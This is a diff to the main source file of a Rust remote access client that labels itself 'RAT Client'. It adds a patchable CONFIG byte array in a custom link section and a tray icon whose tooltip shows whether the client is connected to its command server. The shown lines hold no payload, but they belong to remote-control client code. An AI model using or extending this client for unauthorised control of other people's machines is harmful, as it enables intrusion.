@@ -1,3 +1,7 @@
+#[no_mangle]
+#[link_section = ".zzz"]
+static CONFIG: [u8; 1024] = [0; 1024];
+
 use std::net::TcpStream;
 use std::path::PathBuf;
 use std::process::Child;
@@ -9,6 +13,7 @@ pub mod handler;
 pub mod service;
 pub mod settings;
 
+use features::tray_icon;
 use handler::handle_command;
 use common::buffers::read_buffer;
 use rand::{ rngs::OsRng, Rng };
@@ -16,6 +21,7 @@ use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
 use std::process;
 
+use crate::features::tray_icon::TrayIcon;
 use common::commands::{Command, EncryptionResponseData};
 use common::buffers::write_buffer;
 
@@ -177,13 +183,21 @@ fn handle_server(
 fn main() {
     service::mutex::mutex_lock();
     let is_connected = Arc::new(Mutex::new(false));
+    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
 
+    tray_icon.lock().unwrap().show();
     loop {
         let is_connected_clone = is_connected.clone();
+        let tray_icon_clone = tray_icon.clone();
         if *is_connected_clone.lock().unwrap() {
+            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
             sleep(std::time::Duration::from_secs(5));
             continue;
         }
+        else {
+            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+        }
+
 
         std::thread::spawn(move || {
             println!("Connecting to server...");
